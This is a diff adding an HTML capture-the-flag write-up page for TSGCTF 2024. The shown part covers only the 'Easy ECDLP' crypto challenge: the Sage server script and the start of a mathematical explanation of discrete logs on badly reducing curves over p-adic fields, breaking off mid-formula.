@@ -1,0 +1,605 @@
+<!doctype html> <html lang=en > <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/wednesday/libs/katex/katex.min.css"> <link rel=stylesheet  href="/wednesday/libs/highlight/styles/base16/chalk.min.css" /> <link rel=stylesheet  href="/wednesday/css/franklin.css" /> <link rel=stylesheet  href="/wednesday/css/tufte.css" /> <link rel=stylesheet  href="/wednesday/css/latex.css" /> <link rel=stylesheet  href="/wednesday/css/adjust.css" /> <link rel=icon  href="/wednesday/assets/favicon.png" /> <title>TSGCTF 2024</title> <div id=layout > <div id=menu > <ul> <li><a href="/wednesday/">home</a> <li><a href="/wednesday/about/">about</a> <li><a href="/wednesday/ctf/">ctf</a> </ul> </div> <div id=main > <div class=franklin-content ><h1 id=tsgctf_2024 ><a href="#tsgctf_2024" class=header-anchor >TSGCTF 2024</a></h1> <div class=franklin-toc ><ol><li><a href="#easy_ecdlp_crypto">Easy&#40;??&#41; ECDLP &#40;crypto&#41;</a><li><a href="#fl_support_center_pwn">FL Support Center &#40;pwn&#41;</a></ol></div> <h2 id=easy_ecdlp_crypto ><a href="#easy_ecdlp_crypto" class=header-anchor >Easy&#40;??&#41; ECDLP &#40;crypto&#41;</a></h2> <p>In this challenge, we must solve 250 ECDLPs over the field <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant=double-struck >Q</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">\mathbb{Q}_p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.975em;vertical-align:-0.2861em;"></span><span class=mord ><span class="mord mathbb">Q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> of <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>-adic numbers, where <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> is a large prime chosen by us.</p> <pre><code class="python hljs"><span class=hljs-comment >#!/usr/bin/env sage</span>
+<span class=hljs-keyword >from</span> flag <span class=hljs-keyword >import</span> flag
+<span class=hljs-keyword >import</span> secrets
+<span class=hljs-keyword >import</span> sys
+
+QUERY_NUM = <span class=hljs-number >250</span>
+PREC = <span class=hljs-number >8</span>
+PRIME_BITS = <span class=hljs-number >200</span>
+
+p = <span class=hljs-built_in >int</span>(<span class=hljs-built_in >input</span>(<span class=hljs-string >&quot;Send your prime: &quot;</span>))
+
+<span class=hljs-keyword >assert</span> p.bit_length() &gt;= PRIME_BITS <span class=hljs-keyword >and</span> is_prime(p)
+
+k = Qp(p,PREC)
+R = k.integer_ring()
+p = k(p)
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">sage_encode</span>(<span class=hljs-params >obj</span>):
+    <span class=hljs-keyword >from</span> sage.misc.persist <span class=hljs-keyword >import</span> SagePickler
+    <span class=hljs-keyword >from</span> base64 <span class=hljs-keyword >import</span> b64encode
+    <span class=hljs-keyword >return</span> b64encode(SagePickler.dumps(obj)).decode(<span class=hljs-string >&#x27;ascii&#x27;</span>)
+
+<span class=hljs-keyword >for</span> i <span class=hljs-keyword >in</span> <span class=hljs-built_in >range</span>(QUERY_NUM):
+    <span class=hljs-keyword >while</span> <span class=hljs-literal >True</span>:
+        <span class=hljs-keyword >try</span>:
+            j = k.random_element()
+            j *= p**(-j.valuation()+secrets.choice([-<span class=hljs-number >3</span>,-<span class=hljs-number >2</span>,-<span class=hljs-number >2</span>]))
+            ec = EllipticCurve_from_j(j)
+            <span class=hljs-keyword >break</span>
+        <span class=hljs-keyword >except</span> ArithmeticError:
+            <span class=hljs-keyword >pass</span>
+    <span class=hljs-keyword >while</span> <span class=hljs-literal >True</span>:
+        <span class=hljs-keyword >try</span>:
+            g = k.random_element()
+            P = ec.lift_x(g**<span class=hljs-number >2</span>)
+            secret = secrets.randbelow(<span class=hljs-built_in >int</span>(<span class=hljs-number >2</span>**(PRIME_BITS*PREC)))
+            Q = secret*P
+            <span class=hljs-keyword >break</span>
+        <span class=hljs-keyword >except</span> ValueError:
+            <span class=hljs-keyword >pass</span>
+
+    <span class=hljs-built_in >print</span>(sage_encode(ec))
+    <span class=hljs-built_in >print</span>(sage_encode(P))
+    <span class=hljs-built_in >print</span>(sage_encode(Q))
+
+    ans = <span class=hljs-built_in >int</span>(<span class=hljs-built_in >input</span>(<span class=hljs-string >&quot;Send your answer: &quot;</span>))
+    <span class=hljs-keyword >if</span> ans*P != Q:
+        <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;Wrong answer, bye...&quot;</span>)
+        sys.exit(<span class=hljs-number >1</span>)
+
+<span class=hljs-built_in >print</span>(flag)</code></pre> <p>Let <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mi mathvariant=normal >/</mi><msub><mi mathvariant=double-struck >Q</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">E/\mathbb{Q}_p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class=mord >/</span><span class=mord ><span class="mord mathbb">Q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> be an elliptic curve of the form</p> <div class=nonumber ><span class=katex-display ><span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML" display=block ><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo separator=true >,</mo><mspace width=1em /><mi>a</mi><mo separator=true >,</mo><mi>b</mi><mo>∈</mo><msub><mi mathvariant=double-struck >Q</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex"> y^2 = x^3 + ax + b, \quad a,b \in \mathbb{Q}_p </annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.0585em;vertical-align:-0.1944em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:0.9474em;vertical-align:-0.0833em;"></span><span class=mord ><span class="mord mathnormal">x</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">b</span><span class=mpunct >,</span><span class=mspace  style="margin-right:1em;"></span><span class=mspace  style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >∈</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:0.975em;vertical-align:-0.2861em;"></span><span class=mord ><span class="mord mathbb">Q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></span></div> <p>and let <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><mo stretchy=false >(</mo><msub><mi>p</mi><mi>x</mi></msub><mo separator=true >,</mo><msub><mi>p</mi><mi>y</mi></msub><mo stretchy=false >)</mo></mrow><annotation encoding="application/x-tex">P = (p_x, p_y)</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:1.0361em;vertical-align:-0.2861em;"></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.15em;"><span></span></span></span></span></span></span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mclose >)</span></span></span></span>, <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mo stretchy=false >(</mo><msub><mi>q</mi><mi>x</mi></msub><mo separator=true >,</mo><msub><mi>q</mi><mi>y</mi></msub><mo stretchy=false >)</mo></mrow><annotation encoding="application/x-tex">Q = (q_x, q_y)</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:1.0361em;vertical-align:-0.2861em;"></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.15em;"><span></span></span></span></span></span></span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mclose >)</span></span></span></span> be points of <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy=false >(</mo><msub><mi mathvariant=double-struck >Q</mi><mi>p</mi></msub><mo stretchy=false >)</mo></mrow><annotation encoding="application/x-tex">E(\mathbb{Q}_p)</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class=mopen >(</span><span class=mord ><span class="mord mathbb">Q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mclose >)</span></span></span></span> such that <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><mi>s</mi><mi>Q</mi></mrow><annotation encoding="application/x-tex">P = sQ</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">Q</span></span></span></span>.</p> <p>In most cases, there is a general algorithm for solving ECDLPs over <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant=double-struck >Q</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">\mathbb{Q}_p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.975em;vertical-align:-0.2861em;"></span><span class=mord ><span class="mord mathbb">Q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>, given by <a href="https://www.researchgate.net/profile/Masaya-Yasuda/publication/236009642_A_generalization_of_the_anomalous_attack_for_the_ECDLP_over_Q_p/links/0046352cb982bc0f21000000/A-generalization-of-the-anomalous-attack-for-the-ECDLP-over-Q-p.pdf">Masaya Yasuda &#40;2012&#41;</a>, however that algorithm relies on the elliptic curve having a good reduction &#40;i.e it does not reduce to a singular curve&#41;, which is not the case here. Instead, the server explicitly chooses <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>-invariants of negative valuation to force a bad reduction.</p> <p>To solve this, we first transpose to an equivalent problem with strictly integer parameters by multiplying both sides of the equation by a sufficiently large power of <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>. Specifically, let <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo separator=true >,</mo><mi>Y</mi><mo separator=true >,</mo><mi>A</mi><mo separator=true >,</mo><mi>B</mi><mo>∈</mo><msub><mi mathvariant=double-struck >Z</mi><mrow><mo>≥</mo><mn>0</mn></mrow></msub></mrow><annotation encoding="application/x-tex">X, Y, A, B \in \mathbb{Z}_{\geq 0}</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >∈</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:0.9341em;vertical-align:-0.2452em;"></span><span class=mord ><span class="mord mathbb">Z</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">≥</span><span class="mord mtight">0</span></span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2452em;"><span></span></span></span></span></span></span></span></span></span> be the smallest non-negative integers such that</p> <div class=nonumber ><span class=katex-display ><span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML" display=block ><semantics><mrow><mn>2</mn><mi>Y</mi><mo>=</mo><mn>3</mn><mi>X</mi><mo>=</mo><mi>A</mi><mo>+</mo><mi>X</mi><mo>=</mo><mi>B</mi><mo separator=true >,</mo></mrow><annotation encoding="application/x-tex"> 2Y = 3X = A + X = B, </annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.6833em;"></span><span class=mord >2</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:0.6833em;"></span><span class=mord >3</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class=mpunct >,</span></span></span></span></span></div> <p>and</p> <div class=nonumber ><span class=katex-display ><span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML" display=block ><semantics><mtable rowspacing=0.25em  columnalign="right left" columnspacing=0em ><mtr><mtd><mstyle scriptlevel=0  displaystyle=true ><mi>Y</mi></mstyle></mtd><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mrow></mrow><mo>≥</mo><mrow><mi mathvariant=normal >m</mi><mi mathvariant=normal >i</mi><mi mathvariant=normal >n</mi></mrow><mrow><mo fence=true >{</mo><msub><mi>ν</mi><mi>p</mi></msub><mo stretchy=false >(</mo><msub><mi>p</mi><mi>x</mi></msub><mo stretchy=false >)</mo><mo separator=true >,</mo><msub><mi>ν</mi><mi>p</mi></msub><mo stretchy=false >(</mo><msub><mi>q</mi><mi>x</mi></msub><mo stretchy=false >)</mo><mo fence=true >}</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=0  displaystyle=true ><mi>X</mi></mstyle></mtd><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mrow></mrow><mo>≥</mo><mrow><mi mathvariant=normal >m</mi><mi mathvariant=normal >i</mi><mi mathvariant=normal >n</mi></mrow><mrow><mo fence=true >{</mo><msub><mi>ν</mi><mi>p</mi></msub><mo stretchy=false >(</mo><msub><mi>p</mi><mi>y</mi></msub><mo stretchy=false >)</mo><mo separator=true >,</mo><msub><mi>ν</mi><mi>p</mi></msub><mo stretchy=false >(</mo><msub><mi>q</mi><mi>y</mi></msub><mo stretchy=false >)</mo><mo fence=true >}</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=0  displaystyle=true ><mi>A</mi></mstyle></mtd><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mrow></mrow><mo>≥</mo><msub><mi>ν</mi><mi>p</mi></msub><mo stretchy=false >(</mo><mi>a</mi><mo stretchy=false >)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=0  displaystyle=true ><mi>B</mi></mstyle></mtd><mtd><mstyle scriptlevel=0  displaystyle=true ><mrow><mrow></mrow><mo>≥</mo><msub><mi>ν</mi><mi>p</mi></msub><mo stretchy=false >(</mo><mi>b</mi><mo stretchy=false >)</mo><mi mathvariant=normal >.</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} Y &amp;\geq \mathrm{min}\left\{\nu_p(p_x), \nu_p(q_x)\right\}\\ X &amp;\geq \mathrm{min}\left\{\nu_p(p_y), \nu_p(q_y)\right\}\\ A &amp;\geq \nu_p(a)\\ B &amp;\geq \nu_p(b). \end{aligned}</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:6em;vertical-align:-2.75em;"></span><span class=mord ><span class=mtable ><span class=col-align-r ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:3.25em;"><span style="top:-5.41em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span><span style="top:-3.91em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span><span style="top:-2.41em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class="mord mathnormal">A</span></span></span><span style="top:-0.91em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:2.75em;"><span></span></span></span></span></span><span class=col-align-l ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:3.25em;"><span style="top:-5.41em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class=mord ></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >≥</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mord ><span class="mord mathrm">min</span></span><span class=mspace  style="margin-right:0.1667em;"></span><span class=minner ><span class="mopen delimcenter" style="top:0em;">{</span><span class=mord ><span class="mord mathnormal" style="margin-right:0.06366em;">ν</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0637em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.15em;"><span></span></span></span></span></span></span><span class=mclose >)</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.06366em;">ν</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0637em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.15em;"><span></span></span></span></span></span></span><span class=mclose >)</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span><span style="top:-3.91em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class=mord ></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >≥</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mord ><span class="mord mathrm">min</span></span><span class=mspace  style="margin-right:0.1667em;"></span><span class=minner ><span class="mopen delimcenter" style="top:0em;">{</span><span class=mord ><span class="mord mathnormal" style="margin-right:0.06366em;">ν</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0637em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mclose >)</span><span class=mpunct >,</span><span class=mspace  style="margin-right:0.1667em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.06366em;">ν</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0637em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mopen >(</span><span class=mord ><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span><span class=mclose >)</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span><span style="top:-2.41em;"><span class=pstrut  style="height:3em;"></span><span class=mord ><span class=mord ></span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >≥</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mord ><span class="mord mathnormal" style="margin-right:0.06366em;">ν</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span 